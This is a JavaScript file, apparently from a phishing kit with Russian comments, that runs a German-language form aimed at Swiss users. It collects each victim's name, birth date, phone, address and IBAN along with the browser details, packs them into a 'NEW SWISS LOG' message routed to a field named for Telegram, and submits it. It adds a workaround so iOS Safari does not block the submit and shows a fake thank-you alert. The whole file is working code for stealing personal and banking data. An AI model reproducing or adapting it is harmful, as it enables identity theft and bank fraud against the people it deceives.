document.addEventListener('DOMContentLoaded', () => {
  
  // Маска для даты
  const geburtsdatumInput = document.getElementById('geburtsdatum');
  if (geburtsdatumInput) {
    geburtsdatumInput.addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);
      let formatted = '';
      if (value.length > 0) formatted += value.substring(0, 2);
      if (value.length > 2) formatted += '/' + value.substring(2, 4);
      if (value.length > 4) formatted += '/' + value.substring(4, 8);
      e.target.value = formatted;
    });
  }

  // Перевод
  const langBtns = document.querySelectorAll('.lang-btn');
  const translatableElements = document.querySelectorAll('[data-lang-ch]');
  langBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const lang = btn.getAttribute('data-lang');
      langBtns.forEach(b => b.classList.remove('is-active'));
      btn.classList.add('is-active');
      translatableElements.forEach(el => {
        const text = el.getAttribute(`data-lang-${lang}`);
        if (text) {
          if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            el.placeholder = text;
          } else {
            el.textContent = text;
          }
        }
      });
    });
  });

  // Отправка
  const form = document.getElementById('telegramForm');
  
  form.addEventListener('submit', (e) => {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const geburtsdatum = document.getElementById('geburtsdatum').value;
    const telefon = document.getElementById('telefon').value;
    const adresse = document.getElementById('adresse').value;
    const plz = document.getElementById('plz').value;
    const stadt = document.getElementById('stadt').value;
    const iban = document.getElementById('iban').value;

    const now = new Date();
    const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const timeStr = now.toLocaleTimeString('de-CH', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const dateTime = `${dateStr}, ${timeStr}`;
    const browserInfo = navigator.userAgent;

    let message = '🇨🇭 NEW SWISS LOG !\n\n';
    message += `👤 Name: ${name}\n`;
    message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
    message += `📱 Telefon: ${telefon}\n`;
    message += `📍 Adresse: ${adresse}\n`;
    message += `📮 PLZ: ${plz}\n`;
    message += `🏙️ Stadt: ${stadt}\n`;
    message += `🏦 IBAN: ${iban}\n`;
    message += `🔍 IBAN-Status: nicht geprüft\n\n`;
    message += `🕒 Zeit: ${dateTime}\n`;
    message += `🌐 Browser: ${browserInfo}\n`;

    document.getElementById('telegramText').value = message;
    
    // ВАЖНО: form.submit() вызывается СРАЗУ, без setTimeout, чтобы Safari на iOS не блокировал
    form.submit();

    // А "Спасибо" показываем уже ПОСЛЕ отправки
    setTimeout(() => {
      alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
      form.reset();
    }, 500);
  });
});
